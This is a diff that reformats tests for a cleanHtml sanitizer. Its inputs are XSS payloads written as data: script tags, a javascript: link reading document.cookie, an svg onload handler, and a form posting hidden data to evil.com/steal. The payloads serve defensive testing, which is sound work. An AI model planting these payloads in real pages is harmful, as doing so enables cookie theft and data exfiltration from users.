@@ -12,9 +12,7 @@ describe("cleanHtml - XSS prevention", () => {
   });
 
   test("strips <script> with attributes", () => {
-    const result = cleanHtml(
-      '<script type="text/javascript" src="evil.js"></script>',
-    );
+    const result = cleanHtml('<script type="text/javascript" src="evil.js"></script>');
     expect(result).not.toContain("<script");
   });
 
@@ -45,30 +43,24 @@ describe("cleanHtml - XSS prevention", () => {
   });
 
   test("strips javascript: protocol in links", () => {
-    const result = cleanHtml(
-      '<a href="javascript:alert(document.cookie)">click</a>',
-    );
+    const result = cleanHtml('<a href="javascript:alert(document.cookie)">click</a>');
     expect(result).not.toContain("javascript:");
     expect(result).toContain("click");
   });
 
   test("strips data: protocol in links", () => {
-    const result = cleanHtml(
-      '<a href="data:text/html,<script>alert(1)</script>">click</a>',
-    );
+    const result = cleanHtml('<a href="data:text/html,<script>alert(1)</script>">click</a>');
     expect(result).toContain("click");
   });
 
   test("strips <iframe> tags", () => {
-    const result = cleanHtml(
-      '<iframe src="https://evil.com" onload="alert(1)"></iframe>',
-    );
+    const result = cleanHtml('<iframe src="https://evil.com" onload="alert(1)"></iframe>');
     expect(result).not.toContain("<iframe");
   });
 
   test("strips <object> tags", () => {
     const result = cleanHtml(
-      '<object data="evil.swf" type="application/x-shockwave-flash"></object>',
+      '<object data="evil.swf" type="application/x-shockwave-flash"></object>'
     );
     expect(result).not.toContain("<object");
   });
@@ -80,16 +72,14 @@ describe("cleanHtml - XSS prevention", () => {
 
   test("strips <form> tags", () => {
     const result = cleanHtml(
-      '<form action="https://evil.com/steal"><input type="hidden" name="data" value="secret"></form>',
+      '<form action="https://evil.com/steal"><input type="hidden" name="data" value="secret"></form>'
     );
     expect(result).not.toContain("<form");
     expect(result).not.toContain("<input");
   });
 
   test("strips <meta> tags", () => {
-    const result = cleanHtml(
-      '<meta http-equiv="refresh" content="0;url=https://evil.com">',
-    );
+    const result = cleanHtml('<meta http-equiv="refresh" content="0;url=https://evil.com">');
     expect(result).not.toContain("<meta");
   });
 
@@ -99,9 +89,7 @@ describe("cleanHtml - XSS prevention", () => {
   });
 
   test("strips <svg> tags", () => {
-    const result = cleanHtml(
-      '<svg onload="alert(1)"><circle r="50"></circle></svg>',
-    );
+    const result = cleanHtml('<svg onload="alert(1)"><circle r="50"></circle></svg>');
     expect(result).not.toContain("<svg");
   });
 
@@ -113,8 +101,7 @@ describe("cleanHtml - XSS prevention", () => {
 
 describe("cleanHtml - edge cases", () => {
   test("handles deeply nested allowed tags", () => {
-    const input =
-      "<p><b><i><u><strike><sup><sub>deep</sub></sup></strike></u></i></b></p>";
+    const input = "<p><b><i><u><strike><sup><sub>deep</sub></sup></strike></u></i></b></p>";
     const result = cleanHtml(input);
     expect(result).toContain("deep");
     expect(result).toContain("<b>");
